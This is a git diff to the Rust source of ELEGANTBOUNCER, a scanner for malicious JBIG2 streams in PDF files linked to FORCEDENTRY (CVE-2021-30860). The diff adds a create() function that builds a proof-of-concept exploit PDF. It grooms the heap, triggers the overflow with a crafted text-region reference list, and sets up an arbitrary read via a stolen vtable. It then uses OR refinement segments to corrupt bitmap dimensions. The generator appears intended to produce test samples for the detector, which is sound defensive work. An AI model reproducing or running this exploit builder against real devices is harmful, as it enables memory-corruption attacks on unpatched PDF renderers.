@@ -7,7 +7,7 @@
 //  main.rs
 //
 // Abstract:
-//  JBIG2 PDF scanner
+//  ELEGANTBOUNCER JBIG2/PDF scanner for FORCEDENTRY
 //
 // Author:
 //  Matthieu Suiche (msuiche) 20-Nov-2022
@@ -15,14 +15,16 @@
 
 use std::fmt;
 use std::path;
-use std::io::{Seek, SeekFrom, Read, Cursor};
+use std::io::{Seek, SeekFrom, Read, Write, Cursor};
+// use std::fs::File;
 use lopdf::*;
+use lopdf::content::{Content, Operation};
 use colored::*;
 
 use env_logger;
 use log::{info, debug, error, LevelFilter};
 use clap::Parser;
-use byteorder::{ReadBytesExt, BigEndian};
+use byteorder::{ReadBytesExt, WriteBytesExt, BigEndian};
 
 /*
 const CRATE_VERSION: &'static str =
@@ -30,6 +32,22 @@ const CRATE_VERSION: &'static str =
      " (", env!("VERGEN_GIT_COMMIT_TIMESTAMP"), ")");
 */
 const CRATE_VERSION: &'static str = "0.1";
+
+// const DATA_BUFFER_TO_SEGMENTS:          u32 = 0x3B0;
+const DATA_BUFFER_TO_BITMAP:            u32 = 0x4b0;
+// const DATA_BUFFER_TO_KNOWN_GOOD_BITMAP: u32 = 0x4d0;
+const DATA_BUFFER_TO_BITMAP_W:          u32 = DATA_BUFFER_TO_BITMAP + 0x8 + 0x4;
+const DATA_BUFFER_TO_BITMAP_H:          u32 = DATA_BUFFER_TO_BITMAP + 0x8 + 0x8;
+const DATA_BUFFER_TO_BITMAP_LINE:       u32 = DATA_BUFFER_TO_BITMAP + 0x8 + 0xc;
+
+const OR: u8 = 0;
+// const AND: u8  = 1;
+// const XOR: u8  = 2;
+// const XNOR: u8  = 3;
+// const REPLACE: u8  = 4;
+// segment list operations in readGenericReginementSeg()
+// const COMBINE: u8  = 0x2a;
+// const STORE: u8  = 0x28;
 
 /// A program that analyzes PDF files for malformed JBIG2 objects, such as the ones used in FORCEDENTRY.
 #[derive(Parser)]
@@ -97,11 +115,171 @@ pub struct JBIG2SegInfo {
     pub seg_len:        u64,
 }
 
-pub struct JBIG2TextRegionInfo {
+#[derive(Clone)]
+pub struct JBIG2TextRegionSegment {
     pub seg_num:        u32,
-    pub bytes:          Vec<u8>
+
+    pub w:              u32,
+    pub h:              u32,
+    pub x:              u32,
+    pub y:              u32,
+    pub seg_info_flags: u8,
+    pub flags:          u16,
+    pub num_instances:  u32,
+    pub decoder_bytes:  Option<Vec<u8>>,
 }
 
+impl JBIG2TextRegionSegment {
+    fn new(
+        seg_num:        Option<u32>,
+        w:              u32,
+        h:              u32,
+        x:              u32,
+        y:              u32,
+        seg_info_flags: u8,
+        flags:          u16,
+        num_instances:  u32,
+        decoder_bytes:  &[u8]
+    ) -> Self {
+        JBIG2TextRegionSegment {
+            seg_num: seg_num.unwrap_or(0),
+            w,
+            h,
+            x,
+            y,
+            seg_info_flags,
+            flags,
+            num_instances,
+            decoder_bytes: Some(decoder_bytes.to_vec())
+        }
+    }
+
+    fn get_data(&self) -> Result<Vec<u8>> {
+        let mut buf = Vec::new();
+
+        buf.write_u32::<BigEndian>(self.w)?;
+        buf.write_u32::<BigEndian>(self.h)?;
+        buf.write_u32::<BigEndian>(self.x)?;
+        buf.write_u32::<BigEndian>(self.y)?;
+        buf.write_u8(self.seg_info_flags)?;
+        buf.write_u16::<BigEndian>(self.flags)?;
+        buf.write_u32::<BigEndian>(self.num_instances)?;
+
+        if let Some(data) = &self.decoder_bytes {
+            buf.extend(data);
+        }
+
+        Ok(buf)
+    }
+
+}
+
+#[derive(Clone)]
+pub struct JBIG2PageInfoSegment {
+    pub page_w:         u32,
+    pub page_h:         u32,
+    pub x_res:          u32,
+    pub y_res:          u32,
+    pub flags:          u8,
+    pub striping:       u16
+}
+
+impl JBIG2PageInfoSegment {
+    fn new(
+        page_w:         u32,
+        page_h:         u32,
+        x_res:          u32,
+        y_res:          u32,
+        flags:          u8,
+        striping:       u16      
+    ) -> Self {
+        JBIG2PageInfoSegment {
+            page_w,
+            page_h,
+            x_res,
+            y_res,
+            flags,
+            striping
+        }
+    }
+
+    fn get_data(&self) -> Result<Vec<u8>> {
+        let mut buf = Vec::new();
+
+        buf.write_u32::<BigEndian>(self.page_w)?;
+        buf.write_u32::<BigEndian>(self.page_h)?;
+        buf.write_u32::<BigEndian>(self.x_res)?;
+        buf.write_u32::<BigEndian>(self.y_res)?;
+        buf.write_u8(self.flags)?;
+        buf.write_u16::<BigEndian>(self.striping)?;
+
+        Ok(buf)
+    }
+}
+
+#[derive(Clone)]
+pub struct JBIG2GenericRefinementRegionSegment {
+    pub w:              u32,
+    pub h:              u32,
+    pub x:              u32,
+    pub y:              u32,
+    pub seg_info_flags: u8,
+    pub flags:          u8,
+    pub sd_atx:         [u8; 2],
+    pub sd_aty:         [u8; 2],
+    pub decoder_bytes:  Option<Vec<u8>>
+}
+
+impl JBIG2GenericRefinementRegionSegment {
+    fn new(
+        w:              u32,
+        h:              u32,
+        x:              u32,
+        y:              u32,
+        seg_info_flags: u8,
+        flags:          u8,
+        sd_atx:         [u8; 2],
+        sd_aty:         [u8; 2],
+        decoder_bytes:  &[u8]
+    ) -> Self {
+        JBIG2GenericRefinementRegionSegment {
+            w,
+            h,
+            x,
+            y,
+            seg_info_flags,
+            flags,
+            sd_atx,
+            sd_aty,
+            decoder_bytes: Some(decoder_bytes.to_vec())
+        }
+    }
+
+    fn get_data(&self) -> Result<Vec<u8>> {
+        let mut buf = Vec::new();
+
+        buf.write_u32::<BigEndian>(self.w)?;
+        buf.write_u32::<BigEndian>(self.h)?;
+        buf.write_u32::<BigEndian>(self.x)?;
+        buf.write_u32::<BigEndian>(self.y)?;
+        buf.write_u8(self.seg_info_flags)?;
+        buf.write_u8(self.flags)?;
+        if self.flags & 1 == 0 {
+            buf.write_u8(self.sd_atx[0])?;
+            buf.write_u8(self.sd_aty[0])?;
+            buf.write_u8(self.sd_atx[1])?;
+            buf.write_u8(self.sd_aty[1])?;
+        }
+        
+        if let Some(data) = &self.decoder_bytes {
+            buf.extend(data);
+        }
+
+        Ok(buf)
+    }
+}
+
+#[derive(Clone)]
 pub struct JBIG2SymbolDictionarySegment {
     // Extra Identifier
     pub seg_num:        u32,
@@ -110,32 +288,64 @@ pub struct JBIG2SymbolDictionarySegment {
     pub sd_atx:         [u8; 4],
     pub sd_aty:         [u8; 4],
     pub num_ex_syms:    u64,
-    pub num_new_syms:   u64
+    pub num_new_syms:   u64,
+
+    pub decoder_bytes:  Option<Vec<u8>>
 }
 
 impl JBIG2SymbolDictionarySegment {
     fn new(
-        seg_num: u32,
+        seg_num: Option<u32>,
+        flags: u16,
+        sd_atx: [u8; 4],
+        sd_aty: [u8; 4],
         num_ex_syms: u64,
-        num_new_syms: u64) -> Self {
+        num_new_syms: u64,
+        decoder_bytes: &[u8]) -> Self {
+
+        let snum = seg_num.unwrap_or(0xff);
 
         JBIG2SymbolDictionarySegment {
-            seg_num,
-            flags: 0,
-            sd_atx: [0u8; 4],
-            sd_aty: [0u8; 4],
+            seg_num: snum,
+            flags,
+            sd_atx,
+            sd_aty,
             num_ex_syms,
-            num_new_syms
+            num_new_syms,
+            decoder_bytes: Some(decoder_bytes.to_vec())
         }
-    }
-
-    fn get_seg_num(&self) -> u32 {
-        self.seg_num
     }
 
     fn get_num_ex_syms(&self) -> u64 {
         self.num_ex_syms
     }
+
+    fn get_data(&self) -> Result<Vec<u8>> {
+        let mut buf = Vec::new();
+
+        buf.write_u16::<BigEndian>(self.flags)?;
+        buf.write_u8(self.sd_atx[0])?;
+        buf.write_u8(self.sd_aty[0])?;
+        buf.write_u8(self.sd_atx[1])?;
+        buf.write_u8(self.sd_aty[1])?;
+        buf.write_u8(self.sd_atx[2])?;
+        buf.write_u8(self.sd_aty[2])?;
+        buf.write_u8(self.sd_atx[3])?;
+        buf.write_u8(self.sd_aty[3])?;
+        
+        buf.write_u32::<BigEndian>(self.num_ex_syms as u32)?;
+        buf.write_u32::<BigEndian>(self.num_new_syms as u32)?;
+        if let Some(data) = &self.decoder_bytes {
+            buf.extend(data);
+        }
+
+        Ok(buf)
+    }
+
+    /*
+    fn get_seg_len(&self) -> usize {
+
+    }*/
 }
 
 impl fmt::Display for JBIG2SegmentType {
@@ -167,6 +377,14 @@ impl fmt::Display for JBIG2SegmentType {
     }
 }
 
+#[derive(Clone)]
+pub enum JBIG2SegmentData {
+    Unassigned,
+    JBIG2SymbolDictionarySegment(JBIG2SymbolDictionarySegment),
+    JBIG2TextRegionSegment(JBIG2TextRegionSegment)
+}
+
+#[derive(Clone)]
 pub struct JBIG2Segment {
     pub seg_num:        u32,
     pub seg_flags:      u32,
@@ -181,45 +399,37 @@ pub struct JBIG2Segment {
 
     pub seg_len:        usize,
 
-    pub refs:           Vec<u8>,
-    pub num_ex_syms:    u64
+    pub refs:           Option<Vec<u8>>,
+    // pub num_ex_syms:    u64,
+
+    pub data:           JBIG2SegmentData
 }
 
 impl JBIG2Segment { 
-    fn new() -> Self {
-        JBIG2Segment {
-            seg_num: 0,
-            seg_flags: 0,
-            ref_flags: 0,
-            is_large: false,
-            ref_count: 0,
-            ref_segs_len: 0,
-            seg_size: 0,
-            page: 0,
-            seg_len: 0,
-            refs: Vec::new(),
-            num_ex_syms: 0
-        }
-    }
-
-    fn set_header(
-        &mut self,
+    fn new(
         seg_num: u32,
         seg_flags: u32,
         ref_flags: u32,
         page: u32,
-        seg_len: usize) -> Result<()> {
+        seg_len: usize) -> Self {
 
-        self.seg_num = seg_num;
-        self.seg_flags = seg_flags;
-        self.ref_flags = ref_flags;
-        self.page = page;
-        self.seg_len = seg_len;
-
-        Ok(())
+        JBIG2Segment {
+            seg_num,
+            seg_flags,
+            ref_flags,
+            is_large: false,
+            ref_count: 0,
+            ref_segs_len: 0,
+            seg_size: 0,
+            page,
+            seg_len,
+            refs: None,
+            // num_ex_syms: 0,
+            data: JBIG2SegmentData::Unassigned
+        }
     }
 
-    fn read<R: Read + Seek>(&mut self, rdr: &mut R) -> Result<()> {
+    fn read<R: Read + Seek>(rdr: &mut R) -> Result<Self> {
         let seg_num = rdr.read_u32::<BigEndian>()?;
         let seg_flags = rdr.read_u8()? as u32;
 
@@ -229,7 +439,9 @@ impl JBIG2Segment {
 
         let mut ref_segs_len = 0;
 
-        let seg_size = match seg_num {
+        let mut res = JBIG2Segment::new(seg_num, seg_flags, ref_flags, 0, 0);
+
+        let seg_size = match res.get_seg_num() {
             0..=255 => 1 as usize,
             256..=65536 => 2 as usize,
             _ => 4 as usize
@@ -251,35 +463,59 @@ impl JBIG2Segment {
             let mut v = vec![0u8; ref_len];
             rdr.read_exact(&mut v)?;
             refs = v.to_vec();
+
+            res.data = JBIG2SegmentData::JBIG2TextRegionSegment(
+                JBIG2TextRegionSegment::new(
+                    Some(res.get_seg_num()),
+                    0, 0, 0, 0, // w, h, x, y
+                    0, // seg_info_flags
+                    0, // flags
+                    0, // num_instances
+                    &[])
+            );
         }
 
         // TODO: if seg_flags & 0x40 -> rdr.read_u32()
         // TODO: means that get_seg_hdr_len() needs += 3 also
         let page = rdr.read_u8()? as u32;
         let seg_len = rdr.read_u32::<BigEndian>()? as usize;
+        res.page = page;
+        res.seg_len = seg_len;
         
         // JBIG2SymbolDict
-        let mut num_ex_syms = 0;
-        if seg_flags & 0x3f == 0 {
-            rdr.read_u16::<BigEndian>()? as usize; // flags
-            rdr.read_u32::<BigEndian>()? as usize;
-            rdr.read_u32::<BigEndian>()? as usize;
-            num_ex_syms = rdr.read_u32::<BigEndian>()? as u64;
+        // let mut num_ex_syms = 0;
+        if res.get_type() == JBIG2SegmentType::SymbolDict {
+            let flags = rdr.read_u16::<BigEndian>()? as u16;
+            let atx = rdr.read_u32::<BigEndian>()?;
+            let aty = rdr.read_u32::<BigEndian>()?;
+            let num_ex_syms = rdr.read_u32::<BigEndian>()? as u64;
+            let num_new_syms = rdr.read_u32::<BigEndian>()? as u64;
+
+            res.data = JBIG2SegmentData::JBIG2SymbolDictionarySegment(
+                JBIG2SymbolDictionarySegment::new(
+                Some(res.get_seg_num()),
+                flags,
+                atx.to_be_bytes(),
+                aty.to_be_bytes(),
+                num_ex_syms,
+                num_new_syms,
+                &[])
+            );
         } 
 
-        self.seg_num = seg_num;
-        self.seg_flags = seg_flags;
-        self.ref_flags = ref_flags;
-        self.is_large = is_large;
-        self.ref_count = ref_count;
-        self.ref_segs_len = ref_segs_len;
-        self.seg_size = seg_size;
-        self.page = page;
-        self.seg_len = seg_len;
-        self.refs = refs;
-        self.num_ex_syms = num_ex_syms;
+        // self.seg_num = seg_num;
+        // self.seg_flags = seg_flags;
+        // self.ref_flags = ref_flags;
+        res.is_large = is_large;
+        res.ref_count = ref_count;
+        res.ref_segs_len = ref_segs_len;
+        res.seg_size = seg_size;
+        res.page = page;
+        // v.seg_len = seg_len;
+        res.refs = Some(refs);
+        // self.num_ex_syms = num_ex_syms;
 
-        Ok(())
+        Ok(res)
     }
 
     pub fn get_type(&self) -> JBIG2SegmentType {
@@ -336,68 +572,96 @@ impl JBIG2Segment {
         }
     }
 
-    fn get_refs(&self) -> &Vec<u8> {
-        &self.refs
+    fn get_refs(&self) -> Result<Vec<u8>> {
+        let mut buf = Vec::new();
+
+        if let Some(refs) = &self.refs {
+            buf.extend(refs);
+        }
+        Ok(buf)
+    }
+
+    fn set_refs(&mut self, refs: Vec<u8>) {
+        self.refs = Some(refs.clone());
+        self.is_large = true;
     }
 
     fn get_num_ex_syms(&self) -> u64 {
-        self.num_ex_syms
+        let v = match &self.data {
+            JBIG2SegmentData::JBIG2SymbolDictionarySegment(sds) => {
+                sds.get_num_ex_syms()
+            },
+            _ => 0
+        };
+
+        v
+    }
+
+    fn get_data(&self) -> Result<Vec<u8>> {
+        let mut buf = Vec::new();
+
+        if self.is_large() == false {
+            buf.write_u32::<BigEndian>(self.seg_num)?;
+            buf.write_u8(self.seg_flags as u8)?;
+            buf.write_u8(self.ref_flags as u8)?;
+            buf.write_u8(self.page as u8)?;
+            buf.write_u32::<BigEndian>(self.seg_len as u32)?;
+        } else {
+            buf.write_u32::<BigEndian>(self.seg_num)?;
+            buf.write_u8(self.seg_flags as u8)?;
+            buf.write_u32::<BigEndian>(self.ref_flags)?;
+            if let Some(refs) = &self.refs {
+                buf.extend(refs);
+            }
+            buf.write_u8(self.page as u8)?;
+            buf.write_u32::<BigEndian>(self.seg_len as u32)?;
+        }
+
+        Ok(buf)
     }
 }
 
 pub struct JBIG2Stream {
-    pub syms:       Vec<JBIG2SymbolDictionarySegment>,
-    pub regions:    Vec<JBIG2TextRegionInfo>
+    pub segs:       Vec<JBIG2Segment>,
+    pub syms:       Vec<JBIG2Segment>,
+    pub regions:    Vec<JBIG2Segment>
 }
 
 impl JBIG2Stream {
     fn new() -> Self {
         JBIG2Stream {
+            segs: Vec::new(),
             syms: Vec::new(),
             regions: Vec::new()
         }
     }
 
+    pub fn get_syms_len(&self) -> usize {
+        self.syms.len()
+    }
+
     pub fn get_len_by_seg_num(&self, seg_num: u32) -> u64 {
+        /*
+        let syms = self.segs
+        .iter()
+        .filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::SymbolDict);
+        */
+        
         for sym in &self.syms {
             if seg_num == sym.get_seg_num() {
-                return sym.get_num_ex_syms()
+                return sym.get_num_ex_syms();
             }
         }
-    
+
         0
     }
 
     fn parse_jbig2_stream(&mut self, in_buf: &[u8]) -> Result<()> {
         let mut rdr = Cursor::new(in_buf);
-        let mut seg_hdr = JBIG2Segment::new();
 
         loop {
-            if let Ok(_) = seg_hdr.read(&mut rdr.clone()) {
-                /*
-                debug!("segNum = 0x{:x} type: {} seg_len: 0x{:x} ref_count: {:x} is_large: {}",
-                    seg_hdr.get_seg_num(), seg_hdr.get_type(), seg_hdr.get_seg_len(),
-                    seg_hdr.get_ref_len(), seg_hdr.is_large());
-                */
-
-                if seg_hdr.get_type() == JBIG2SegmentType::SymbolDict {
-                    let dict_sym = JBIG2SymbolDictionarySegment::new(
-                        seg_hdr.get_seg_num(),
-                        seg_hdr.get_num_ex_syms(),
-                        0
-                    );
-                    self.syms.push(dict_sym);
-                } else if seg_hdr.get_type() == JBIG2SegmentType::TextRegion1 {
-                    if seg_hdr.get_seg_num() <= 256 {
-
-                        self.regions.push(JBIG2TextRegionInfo {
-                            seg_num: seg_hdr.get_seg_num(),
-                            bytes: seg_hdr.get_refs().to_vec()
-                        });
-                    } else {
-                        error!("need to read the text region by blocks of 2 or 4 bytes.");
-                    }
-                }
+            if let Ok(seg_hdr) = JBIG2Segment::read(&mut rdr.clone()) {
+                self.segs.push(seg_hdr.clone());
 
                 if seg_hdr.get_seg_len() == 0 && seg_hdr.get_seg_num() == 0 {
                     break;
@@ -409,27 +673,44 @@ impl JBIG2Stream {
             }
         }
 
+        // This is too slow to filter every time we call get_len_by_seg_num(), so we need to cache it.
+        let syms = self.segs.iter().filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::SymbolDict);
+        for sym in syms {
+            self.syms.push(sym.clone());
+        }
+
+        let regions = self.segs.iter().filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::TextRegion1);
+        for region in regions {
+            self.regions.push(region.clone());
+        }
+
         Ok(())
     }
 
     #[allow(dead_code)]
     fn display_data(&self) {
         // debug!("number of segments: 0x{:x}", segs.len());
-        info!("number of symbols: 0x{:x}", self.syms.len());
+        info!("number of symbols: 0x{:x}", self.get_syms_len());
         info!("number of regions: 0x{:x}", self.regions.len());
 
-        for sym in &self.syms {
-            info!("seg_num: 0x{:x} size: 0x{:x}", sym.seg_num, sym.num_ex_syms);
-        }
+        self.segs
+        .iter()
+        .filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::SymbolDict)
+        .for_each(|sym| {
+            info!("seg_num: 0x{:x} size: 0x{:x}", sym.get_seg_num(), sym.get_num_ex_syms());
+        });
+
     }
 
     fn is_forcedentry(&self) -> bool {
         for region in &self.regions {
             let mut num_syms = 0;
-            for ref_seg_num in &region.bytes {
-                let sz = self.get_len_by_seg_num(*ref_seg_num as u32);
-                num_syms += sz;
-                debug!("0x{:x} -> {:x} (0x{:x})", ref_seg_num, sz, num_syms);
+            if let Ok(refs) = region.get_refs() {
+                for ref_seg_num in refs {
+                    let sz = self.get_len_by_seg_num(ref_seg_num as u32);
+                    num_syms += sz;
+                    // debug!("0x{:x} -> {:x} (0x{:x})", ref_seg_num, sz, num_syms);
+                }
             }
             if num_syms > std::u32::MAX as u64 {
                 return true;
@@ -440,7 +721,8 @@ impl JBIG2Stream {
     }
 }
 
-fn analyze(path: &path::Path) {
+fn analyze(path: &path::Path) -> Result<()> {
+    info!("Opening {}...", path.display());
     let doc = Document::load(path).unwrap();
 
     let mut jbig2_stream = JBIG2Stream::new();
@@ -515,16 +797,297 @@ fn analyze(path: &path::Path) {
     } else {
         info!("CVE-2021-30860 vulnerability trigger... {}", "Safe.".green());
     }
+
+    Ok(())
 }
 
-fn create(_path: &path::Path) {
 
+fn or_808080h_at_offset_h<W: Write>(out: &mut W, offset: u32) -> Result<()> {
+    // encode_bit(&ctx, ctx.context, 0, 1);
+    let data_bytes = [0xff, 0x7f, 0xff, 0xac];
+
+	for idx in 0..3 {
+        let grrs = JBIG2GenericRefinementRegionSegment::new(
+            0x1,
+            0x1,
+            0, 
+            offset + idx,
+            OR,
+            0,
+            [0,0], 
+            [0,0], 
+            &data_bytes);
+        let data = grrs.get_data()?;
+        let grrs_sh = JBIG2Segment::new(0xffffffff, 0x2a, 0, 1, data.len());
+        out.write_all(&grrs_sh.get_data()?)?;
+        out.write_all(&data)?;
+    }
+
+    Ok(())
 }
 
-fn main() {
+fn write_dbg_header<W: Write>(out: &mut W) -> Result<()> {
+    let dbg_sh = JBIG2Segment::new(0xffffffff, 0x34, 0, 1, 0);
+    out.write_all(&dbg_sh.get_data()?)?;
+
+    Ok(())
+}
+
+fn or_bytes_at_offset_w<W: Write>(out: &mut W, mask: u32, offset: u32) -> Result<()> {
+    // encode_bit(&ctx, ctx.context, 0, 1);
+    let or_one = [0xff, 0x7f, 0xff, 0xac];
+    // encode_bit(&ctx, ctx.context, 0, 0);
+    let or_zero = [0x7f, 0xff, 0xac];
+
+    let bitshift = u32::to_be(mask);
+
+	for bit in 0..32 {
+        let mut decoder_bytes: &[u8] = &or_one;
+        let encode_bit = (bitshift >> (31 - bit)) & 1;
+        if encode_bit == 0 {
+            decoder_bytes =  &or_zero;
+        }
+
+        let grrs = JBIG2GenericRefinementRegionSegment::new(
+            0x1,
+            0x1,
+            (offset << 3) + bit,
+            0,
+            OR,
+            0,
+            [0,0], 
+            [0,0], 
+            decoder_bytes);
+        let data = grrs.get_data()?;
+        let grrs_sh = JBIG2Segment::new(0xffffffff, 0x2a, 0, 1, data.len());
+        out.write_all(&grrs_sh.get_data()?)?;
+        out.write_all(&data)?;
+    }
+
+    Ok(())
+}
+
+fn create_pdf(path: &path::Path, global_stream: &Vec<u8>, main_stream: &Vec<u8>) -> Result<()> {
+    let mut doc = Document::with_version("1.5");
+    // doc.reference_table.cross_reference_type = xref::XrefType::CrossReferenceTable;
+
+    let catalog_id = doc.new_object_id();
+    let outlines = doc.add_object(dictionary! {"Type" => "Outlines", "Count" => "0"});
+    let pages_id = doc.new_object_id();
+
+    let symd = doc.add_object(Stream::new(dictionary! {}, global_stream.to_vec()));
+    let img_name = "Im1";
+
+    let xobj = doc.add_object(Stream::new(dictionary! {
+        "DecodeParms" => dictionary!{ 
+            "JBIG2Globals" => symd
+        },
+        "Width" => Object::Integer(1),
+        "ColorSpace" => "DeviceGray",
+        "Height" => Object::Integer(1),
+        "Filter" => "JBIG2Decode",
+        "Subtype" => "Image",
+        "Type" => "XObject",
+        "BitsPerComponent" => Object::Integer(1),
+    }, main_stream.to_vec()));
+
+    let contents = doc.add_object(Stream::new(dictionary! {}, 
+        Content {
+            operations: vec![
+                Operation::new("q", vec![]),
+                Operation::new(
+                    "cm",
+                    vec![Object::Real(1f32), 0.into(), 0.into(), Object::Real(1f32), 0.into(), 0.into()],
+                ),
+                Operation::new("Do", vec![img_name.clone().into()]),
+                Operation::new("Q", vec![]),
+            ]
+        }.encode().unwrap()));
+
+    let resources = doc.add_object(dictionary! {
+        "XObject" => dictionary!{ 
+            img_name => xobj
+        },
+        "ProcSet" => Object::Array(vec![Object::Name(b"PDF".to_vec()), Object::Name(b"ImageB".to_vec())]),
+    });
+    
+    let page_id = doc.add_object(dictionary! {
+        "Type" => "Page",
+        "Parent" => pages_id,
+        "Contents" => contents,
+        "Resources" => resources,
+        "MediaBox" => Object::Array(vec![0.into(), 0.into(), Object::Real(1.0), Object::Real(1.0)]),
+    });
+
+    let pages = dictionary! {
+        "Type" => "Pages",
+        "Kids" => vec![page_id.into()],
+        "Count" => 1,
+    };
+
+    let catalog = dictionary! {
+        "Type" => "Catalog", "Outlines" => outlines, "Pages" => pages_id
+    };
+
+    doc.objects.insert(pages_id, Object::Dictionary(pages));
+    doc.objects.insert(catalog_id, Object::Dictionary(catalog));
+
+    doc.trailer.set("Root", catalog_id);
+
+    doc.save(path).unwrap();
+
+    Ok(())
+}
+
+fn create(path: &path::Path) -> Result<()> {
+    info!("Creating {}..", path.display());
+
+    // Global
+    let sds = JBIG2SymbolDictionarySegment::new(
+        None,
+        0, // flags
+        [0x03,0xFD,0x02,0xFE],
+        [0xFF,0xFF,0xFE,0xFE],
+        1,
+        1,
+        &[0x93, 0xFC, 0x7F, 0xFF, 0xAC]);
+    let sds_bytes = sds.get_data()?;
+    let sds_sh = JBIG2Segment::new(0xff, 0, 1, 0, sds_bytes.len());
+
+    // let mut global_stream = File::create("poc.sym")?;
+    let mut global_stream = Vec::new();
+    global_stream.write_all(&sds_sh.get_data()?)?;
+    global_stream.write_all(&sds_bytes)?;
+
+    // Part 2
+    // let mut main_stream = File::create("poc.0000")?;
+    let mut main_stream = Vec::new();
+
+    let pis = JBIG2PageInfoSegment::new(1, 1, 0, 0, 0, 0);
+    let data = pis.get_data()?;
+    let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+    let sds = JBIG2SymbolDictionarySegment::new(
+        None,
+		0, 
+		[0x03,0xFD,0x02,0xFE], 
+		[0xFF,0xFF,0xFE,0xFE], 
+		0xFFFF, 
+		0xFFFF,
+		&[0x94,0x4f,0x06,0x7b,0xff,0x7f,0xff,0x7f,0xff,0x7f,0xff,0x7d,0xd3,0x26,0xa8,0x9d,0x6c,0xb0,0xee,0x7f,0xff,0xac]
+    );
+    let data = sds.get_data()?;
+    let sds_sh = JBIG2Segment::new(1, 0, 1, 0, data.len());
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+	// force 1Q mallocs to eat up all the free space
+	for _i in 1..0x10000 {
+        let pis = JBIG2PageInfoSegment::new(0x71, 1, 0, 0, 0, 0);
+        let data = pis.get_data()?;
+        let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
+        main_stream.write_all(&sds_sh.get_data()?)?;
+        main_stream.write_all(&data)?;
+    }
+
+    
+    // set up segments Glist for resizing (reallocation)
+	for _i in 0..0xf {
+        let sds = JBIG2SymbolDictionarySegment::new(
+            None,
+            0,
+            [0x03,0xFD,0x02,0xFE],
+            [0xFF,0xFF,0xFE,0xFE],
+            1,
+            1, 
+            &[0x93,0xFC,0x7F,0xFF,0xAC]
+        );
+        let data = sds.get_data()?;
+        let sds_sh = JBIG2Segment::new(2, 0, 1, 0, data.len());
+        main_stream.write_all(&sds_sh.get_data()?)?;
+        main_stream.write_all(&data)?;
+    }
+
+    // allocate 0x80, 0x80, and 0x40 in that order
+    // flags = 0 which means (flags & 1) = 0 (huffman flag)
+    // so this triggers arithDecoder->decodeInt(&dh, iadhStats);
+	// inside readSymbolDictSeg()
+    let sds = JBIG2SymbolDictionarySegment::new(
+        None,
+		0,
+		[0x03,0xFD,0x02,0xFE], 
+		[0xFF,0xFF,0xFE,0xFE], 
+		3, 
+		3, // getSize()
+        &[0x13,0xb0,0xb7,0xcf,0x36,0xb1,0x68,0xbf,0xff,0xac] // Original Decoder Bytes
+    );
+    let data = sds.get_data()?;
+    let sds_sh = JBIG2Segment::new(3, 0, 1, 0, data.len());
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+    // consume some freed blocks
+    let pis = JBIG2PageInfoSegment::new(0x71, 1, 0, 0, 0, 0);
+    let data = pis.get_data()?;
+    let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+	// allocate page that will be exploited
+	// 0x3F1 results in a malloc of 0x80 for the buffer, should reclaim from cache
+    let pis = JBIG2PageInfoSegment::new(0x3F1, 1, 0, 0, 0, 0);
+    let data = pis.get_data()?;
+    let sds_sh = JBIG2Segment::new(4, 0x30, 0, 1, data.len());
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+    // trigger the vuln and create a bitmap directly after triggering, will steal vtable for arbitrary read
+    let trs = JBIG2TextRegionSegment::new(None, 1, 1, 0, 0, 0, 0, 1, &[0xA9,0x43,0xFF,0xAC]);
+    let mut ref_seg_bytes = Vec::new();
+    ref_seg_bytes.extend_from_slice(&[0xffu8; 0x2d]);
+    ref_seg_bytes.extend_from_slice(&[0x02u8; 0xffd2]);
+    ref_seg_bytes.extend_from_slice(&[0x01u8; 0x10000]);
+    ref_seg_bytes.extend_from_slice(&[0x02u8; 3]);
+    let mut pad = Vec::new();
+    let sz = (ref_seg_bytes.len() + 9) >> 3;
+    for _i in 0..sz { pad.push(0); }
+    // pad.extend_from_slice(&[0x00u8; sz]);
+    let mut refs = Vec::new();
+    refs.extend(pad);
+    refs.extend(&ref_seg_bytes);
+
+    let data = trs.get_data()?;
+    let mut sds_sh = JBIG2Segment::new(5, 0x4, (0xE0000000 + ref_seg_bytes.len()) as u32, 1, data.len());
+    sds_sh.set_refs(refs);
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+    // fail a sanity check but set pageW and pageH to large values so subsequent reads will work 
+    let pis = JBIG2PageInfoSegment::new(0xffffffff, 0xfffffffe, 0, 0, 0, 0);
+    let data = pis.get_data()?;
+    let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
+    main_stream.write_all(&sds_sh.get_data()?)?;
+    main_stream.write_all(&data)?;
+
+    or_808080h_at_offset_h(&mut main_stream, DATA_BUFFER_TO_BITMAP_W)?;
+
+	or_bytes_at_offset_w(&mut main_stream, 0x7fffffff, DATA_BUFFER_TO_BITMAP_W)?;
+	or_bytes_at_offset_w(&mut main_stream, 0x7fffffff, DATA_BUFFER_TO_BITMAP_H)?;
+	or_bytes_at_offset_w(&mut main_stream, 0xFFFFFFFF, DATA_BUFFER_TO_BITMAP_LINE)?;
+
+    write_dbg_header(&mut main_stream)?;
+
+    create_pdf(path, &global_stream, &main_stream)?;
+
+    Ok(())
+}
+
+fn main() -> Result<()> {
     println!("{} v{}", "elegant-bouncer".bold(), CRATE_VERSION);
-    println!("A small utility to check the presence of known vulnerabilities in PDF files.");
-    println!("At the moment it only searches for the presence of {} (CVE-2021-30860).", "FORCEDENTRY".green());
+    println!("{} JBIG2/PDF scanner for {} (CVE-2021-30860)", "ELEGANTBOUNCER".green(), "FORCEDENTRY".green());
+    println!("A small utility to check the presence of known malicious payloads in PDF files.");
     println!("");
 
     let args = Args::parse();
@@ -542,15 +1105,16 @@ fn main() {
 
     if !args.analyze && !args.create {
